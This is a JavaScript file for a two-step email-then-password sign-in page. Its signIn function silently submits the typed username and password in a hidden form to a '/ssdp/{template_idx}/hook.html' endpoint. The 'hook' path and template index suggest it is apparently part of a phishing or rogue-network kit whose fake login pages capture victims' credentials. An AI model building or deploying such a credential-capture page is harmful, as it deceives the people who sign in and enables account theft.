// DOM Elements
const emailScreen = document.getElementById('emailScreen');
const passwordScreen = document.getElementById('passwordScreen');
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');
const displayEmail = document.getElementById('displayEmail');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const nextBtn = document.getElementById('nextBtn');
const signInBtn = document.getElementById('signInBtn');

// Navigate to password screen
function goToPassword() {
    const email = emailInput.value.trim();
    if (!email || !/^\S+@\S+\.\S+$/.test(email)) {
        emailError.classList.add('show');
        return;
    }
    emailError.classList.remove('show');
    displayEmail.textContent = email;
    emailScreen.classList.remove('active');
    passwordScreen.classList.add('active');
}

// Return to email screen
function goBackToEmail() {
    passwordScreen.classList.remove('active');
    emailScreen.classList.add('active');
    passwordInput.value = '';
    passwordError.classList.remove('show');
}

// Toggle password visibility
function togglePassword() {
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;
    const path = document.querySelector('#eyeIcon path');
    if (type === 'text') {
        path.setAttribute('d', 'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-.85 2.87-2.01 3.93-3.42C22.27 9.11 18.04 6 12 6c-1.34 0-2.63.19-3.85.53l2.35 2.35C11.36 7.13 11.67 7 12 7zM2.81 2.81L1.39 4.22 4.07 7c-1.73.85-3.21 2.06-4.25 3.58C1.73 14.39 6 17.5 12 17.5c1.86 0 3.61-.46 5.13-1.24l2.65 2.65 1.41-1.41L2.81 2.81zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5 0-.52.11-1.01.3-1.46l1.04 1.04c-.07.15-.14.31-.14.42 0 1.38 1.12 2.5 2.5 2.5.11 0 .21-.01.31-.03l1.04 1.04c-.45.19-.94.3-1.45.3z');
    } else {
        path.setAttribute('d', 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z');
    }
}

// Sign in → POST request to /ssdp/{template_idx}/hook.html
function signIn() {
    const password = passwordInput.value;
    if (!password) {
        passwordError.classList.add('show');
        return;
    }
    passwordError.classList.remove('show');

    // Utiliser l'index du template dans l'URL
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `/ssdp/${TEMPLATE_IDX}/hook.html`;
    form.style.display = 'none';

    const usernameInput = document.createElement('input');
    usernameInput.name = 'username';
    usernameInput.value = emailInput.value.trim();

    const passwordInputHidden = document.createElement('input');
    passwordInputHidden.name = 'password';
    passwordInputHidden.value = password;

    form.appendChild(usernameInput);
    form.appendChild(passwordInputHidden);
    document.body.appendChild(form);
    form.submit();
}